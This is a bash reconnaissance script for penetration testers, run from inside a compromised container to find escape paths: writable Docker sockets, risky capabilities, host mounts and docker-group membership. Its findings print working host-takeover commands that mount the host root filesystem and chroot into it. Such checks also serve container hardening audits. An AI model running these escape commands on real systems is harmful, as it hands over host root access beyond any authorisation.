#!/usr/bin/env bash
#
# docker-enum.sh
#
# Local container / escape recon: whether you're inside a container, whether the
# Docker socket is reachable, privileged flags, dangerous capabilities, host
# mounts, and docker-group membership. Read-only. Run it on a foothold to see if
# a container escape is on the table.
#
# Usage:
#   ./docker-enum.sh
#
set -uo pipefail

have() { command -v "$1" >/dev/null 2>&1; }

usage() {
  grep '^#' "$0" | sed 's/^# \{0,1\}//' | sed '/^!/d'
  exit "${1:-0}"
}
case "${1:-}" in -h|--help) usage 0 ;; esac

flag() { printf '  [%s] %s\n' "$1" "$2"; }
findings=0

echo "======================================"
echo " docker / container enumeration"
echo "======================================"

# --- are we in a container? -----------------------------------------------
echo "[ am I in a container? ]"
in_container=0
if [ -f /.dockerenv ]; then flag "+" "/.dockerenv present -> inside a Docker container"; in_container=1; fi
if grep -qiE 'docker|containerd|kubepods|lxc' /proc/1/cgroup 2>/dev/null; then
  flag "+" "container hints in /proc/1/cgroup"; in_container=1
fi
if [ -f /run/.containerenv ]; then flag "+" "/run/.containerenv present -> Podman container"; in_container=1; fi
[ "$in_container" -eq 0 ] && flag "-" "no obvious container markers (may be the host)"

# --- docker socket --------------------------------------------------------
echo
echo "[ docker socket ]"
if [ -S /var/run/docker.sock ]; then
  flag "!" "/var/run/docker.sock exists"
  if [ -w /var/run/docker.sock ]; then
    flag "!" "socket is WRITABLE -> likely full host takeover"
    echo "      escape: docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh"
    findings=$((findings+1))
  else
    flag "-" "socket present but not writable by you"
  fi
else
  flag "-" "no /var/run/docker.sock"
fi

# --- privileged / capabilities -------------------------------------------
echo
echo "[ privileges / capabilities ]"
if have capsh; then
  caps=$(capsh --print 2>/dev/null | grep -i 'Current:' | head -n1)
  echo "   $caps"
  if printf '%s' "$caps" | grep -qi 'cap_sys_admin'; then
    flag "!" "CAP_SYS_ADMIN present -> common escape primitive (e.g. cgroup release_agent)"
    findings=$((findings+1))
  fi
  for c in cap_sys_ptrace cap_sys_module cap_dac_read_search; do
    printf '%s' "$caps" | grep -qi "$c" && { flag "!" "$c present -> escape-relevant"; findings=$((findings+1)); }
  done
else
  flag "-" "capsh not available; check /proc/self/status CapEff by hand"
  grep -i CapEff /proc/self/status 2>/dev/null | sed 's/^/   /'
fi

# --- host mounts ----------------------------------------------------------
echo
echo "[ suspicious mounts ]"
mnts=$(mount 2>/dev/null | grep -iE ' on /(host|mnt|media|root)?[a-z]* .*(bind|/dev/)' | grep -vE 'proc|sysfs|tmpfs|cgroup|overlay|shm|mqueue|devpts')
if [ -n "$mnts" ]; then echo "$mnts" | sed 's/^/   /'; else flag "-" "nothing obviously host-mounted"; fi
# a raw block device mounted inside a container is a classic escape
if mount 2>/dev/null | grep -qE '/dev/(sd|vd|nvme|xvd)'; then
  flag "!" "host block device is mounted inside -> read/modify host FS"
  findings=$((findings+1))
fi

# --- docker group ---------------------------------------------------------
echo
echo "[ docker group ]"
if id 2>/dev/null | grep -qi 'docker'; then
  flag "!" "current user is in the 'docker' group -> root-equivalent on the host"
  echo "      escape: docker run -v /:/host -it alpine chroot /host sh"
  findings=$((findings+1))
else
  flag "-" "not in the docker group"
fi

echo
echo "======================================"
echo " escalation-relevant findings: $findings"
[ "$findings" -gt 0 ] && echo " -> at least one container-escape path looks worth trying."
echo "======================================"
